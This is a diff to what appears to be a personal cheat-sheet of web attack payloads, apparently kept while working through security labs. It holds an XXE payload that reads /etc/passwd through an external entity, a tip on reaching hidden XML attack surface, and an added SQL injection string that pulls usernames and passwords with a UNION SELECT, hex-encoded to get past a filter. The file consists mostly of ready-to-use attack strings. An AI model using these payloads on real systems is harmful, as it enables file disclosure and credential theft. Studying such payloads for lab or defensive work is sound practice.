@@ -1,6 +1,9 @@
 # XXE Payloads
 
 ## Exploiting XXE to retrieve files
+
+tags: entities are not allowed for security reasons
+
 ```
 <!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>
 <stockCheck><productId>&xxe;</productId></stockCheck>
@@ -82,3 +85,9 @@ Content-Length: 52
 <?xml version="1.0" encoding="UTF-8"?><foo>bar</foo>
 ```
 If the application tolerates requests containing XML in the message body, and parses the body content as XML, then you can reach the hidden XXE attack surface simply by reformatting requests to use the XML format.
+
+
+the sqli stuff:
+<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
+
+	
